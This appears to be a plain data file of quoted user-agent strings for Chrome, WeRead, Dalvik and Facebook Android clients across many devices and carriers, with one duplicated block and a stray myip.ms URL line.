"Mozilla/5.0 (Linux; Android 9; itel W6501 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.131 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.162 Mobile Safari/537.36"
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5670.196 Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; Infinix X688B Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.162 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5662.208 Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; MAR-LX1M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"https://myip.ms/view/comp_browseragents/5094094/Mozilla_5_0_Linux_Android_10_MAR_LX1M_AppleWebKit_537_36_KHTML_like_Gecko_Chrome_113_0_0_0_Mobile_Safari_537_36.html"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.7700.98 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.9719.95 Safari/537.36"
"Mozilla/5.0 (Linux; Android 13; RMX3516 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.76 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 13; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 13; SM-S916U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 13; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; M2103K19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; M2007J3SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
"WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"Dalvik/2.1.0 (Linux; U; Android 5.1)",
"Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
"Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
"WeRead/5.2.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.3.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.2.4 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.2.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
"WeRead/5.1.2 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.1 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/5.1.0 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.3 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
"WeRead/5.0.5 WRBrand/huawei Dalvik/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
"WeRead/4.2.3 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"WeRead/4.1.5 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
"WeRead/4.1.1 WRBrand/Huawei Dalvik/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
"WeRead/4.1.1 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
"Dalvik/2.1.0 (Linux; U; Android 5.1)",
"Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
"Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
"Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One X;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-T999;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G800H;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/fr_CA;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I317M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/fr_FR;FBCR/Proximus;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/nb_NO;FBCR/TDC;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9305;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=800,height=1280};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N7000;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6903;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/vodafone IE;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D802;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/Movil GSM ;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6916;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBCR/VIVA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6906;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Telecel Bolivia GSM;FBMF/OnePlus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/One;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Telstra Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900I;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9506;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I337M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/movistar;FBMF/bq;FBBD/bq;FBPN/com.facebook.katana;FBDV/Aquaris E5 FHD;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/EMOVIL;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One;FBSV/4.4.3;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SGH-I537;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1920,height=1080};FBLC/el_GR;FBCR/VODAFONE GR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=4.0,width=1440,height=2392};FBLC/es_LA;FBCR/Movil GSM ;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D855;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=4.0,width=1440,height=2392};FBLC/es_LA;FBCR/Personal;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D855;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=4.0,width=1440,height=2560};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920I;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748067;FBDM/{density=1.0,width=1280,height=800};FBLC/de_DE;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-P5210;FBSV/4.4.2;nullFBCA/x86:armeabi-v7a;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748067;FBDM/{density=1.0,width=800,height=1280};FBLC/en_GB;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-P5210;FBSV/4.4.2;nullFBCA/x86:armeabi-v7a;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=786};FBLC/es_LA;FBCR/TELCEL;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H320;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360T;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/iD;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/VIVA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=854};FBLC/en_GB;FBCR/vodafone IE;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/VF-795;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=888};FBLC/en_GB;FBCR/Virgin;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D2303;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=888};FBLC/es_ES;FBCR/Personal;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoE2(4G-LTE);FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Meteor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/iD;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/vodafone ES;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J200M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=720,height=1208};FBLC/en_US;FBCR/IDEA;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5322;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1196,height=720};FBLC/en_GB;FBCR/3;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1196,height=720};FBLC/en_US;FBCR/Tesco Mobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1200,height=1824};FBLC/en_GB;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1200,height=1824};FBLC/en_GB;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1200,height=1824};FBLC/en_US;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1536,height=1952};FBLC/en_GB;FBCR/;FBMF/htc;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 9;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1920,height=1104};FBLC/en_GB;FBCR/;FBMF/asus;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/ALE-L21;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/Claro;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1032;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/O2-IRL;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/vodafone UK;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E5823;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Bell;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoG3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
